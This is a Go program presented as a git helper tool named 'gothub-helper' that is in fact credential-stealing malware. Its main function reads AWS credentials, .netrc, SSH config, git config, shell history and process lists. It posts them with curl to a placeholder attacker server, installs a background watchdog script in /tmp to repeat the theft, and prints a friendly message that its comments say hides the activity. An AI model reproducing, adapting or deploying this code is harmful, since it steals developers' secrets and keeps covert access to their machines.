package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// Config holds the exfiltration destination and local settings
type Config struct {
	ExfilEndpoint string
	WatchdogFile  string
	Interval      time.Duration
}

var cfg = Config{
	ExfilEndpoint: "https://attacker-domain.com/collect", // Your server
	WatchdogFile:  "/tmp/.gothub-helper-watchdog.sh",
	Interval:      30 * time.Second,
}

// Helper function to look like a legitimate utility
func FormatGitLog() string {
	cmd := exec.Command("git", "log", "--oneline", "-5")
	out, _ := cmd.CombinedOutput()
	return string(out)
}

// Collects sensitive data from the environment
func HarvestEnvironment() map[string]interface{} {
	data := make(map[string]interface{})

	// 1. Basic System Info
	data["user"] = os.Getenv("USER")
	data["hostname"] = getHostname()
	data["shell"] = os.Getenv("SHELL")
	data["path"] = os.Getenv("PATH")

	// 2. Git Configuration (may contain tokens)
	gitConfig := readFileIfExists("~/.gitconfig")
	data["gitconfig"] = gitConfig

	// 3. Credentials (AWS, Netrc, SSH keys)
	data["aws_credentials"] = readFileIfExists("~/.aws/credentials")
	data["netrc"] = readFileIfExists("~/.netrc")
	data["ssh_config"] = readFileIfExists("~/.ssh/config")

	// 4. Recent Shell History (passwords typed in clear text)
	histFile := filepath.Join(os.Getenv("HOME"), ".bash_history")
	if histFile == "" {
		histFile = filepath.Join(os.Getenv("HOME"), ".zsh_history")
	}
	data["shell_history_tail"] = tailFile(histFile, 50)

	// 5. Active Processes (to identify running services)
	data["top_processes"] = getTopProcesses()

	return data
}

// Exfiltrates data to the attacker's server
func Exfiltrate(data map[string]interface{}) error {
	payload, err := json.Marshal(data)
	if err != nil {
		return err
	}

	// Use curl for portability, fallback to wget
	cmd := exec.Command("curl", "-X", "POST",
		"-H", "Content-Type: application/json",
		"--data", string(payload),
		cfg.ExfilEndpoint)

	err = cmd.Run()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[gothub-helper] Warning: Exfil failed: %v\n", err)
	}
	return err
}

// Installs a persistent watchdog to ensure continuous data collection
func InstallWatchdog() {
	script := `#!/bin/bash
# gothub-helper watchdog - ensures continuous telemetry
while true; do
    # Re-run the helper binary if it's still available
    if command -v gothub-helper &> /dev/null; then
        gothub-helper --exfil-now > /dev/null 2>&1
    fi
    sleep ` + fmt.Sprintf("%d", int(cfg.Interval.Seconds())) + `
done
`
	if err := os.WriteFile(cfg.WatchdogFile, []byte(script), 0755); err == nil {
		// Launch it in the background
		exec.Command("nohup", cfg.WatchdogFile, "&").Start()
	}
}

func main() {
	// 1. Perform initial harvest
	data := HarvestEnvironment()

	// 2. Exfiltrate immediately
	_ = Exfiltrate(data)

	// 3. Install persistence
	InstallWatchdog()

	// 4. Print a helpful message to the user (to hide the activity)
	fmt.Println("✅ gothub-helper initialized.")
	fmt.Println("   • Git log formatter ready.")
	fmt.Println("   • Environment telemetry active.")
	fmt.Println("   • Watchdog installed for continuous sync.")
}

// --- Utility Functions ---

func getHostname() string {
	out, _ := exec.Command("hostname").Output()
	return strings.TrimSpace(string(out))
}

func readFileIfExists(path string) string {
	path = expandHome(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return ""
	}
	content, _ := os.ReadFile(path)
	return string(content)
}

func tailFile(path string, lines int) string {
	path = expandHome(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return ""
	}
	// Simple tail implementation for brevity
	out, _ := exec.Command("tail", "-n", fmt.Sprintf("%d", lines), path).Output()
	return string(out)
}

func getTopProcesses() string {
	out, _ := exec.Command("ps", "aux").Output()
	return string(out)
}

func expandHome(path string) string {
	home := os.Getenv("HOME")
	if strings.HasPrefix(path, "~") {
		return filepath.Join(home, strings.TrimPrefix(path, "~"))
	}
	return path
}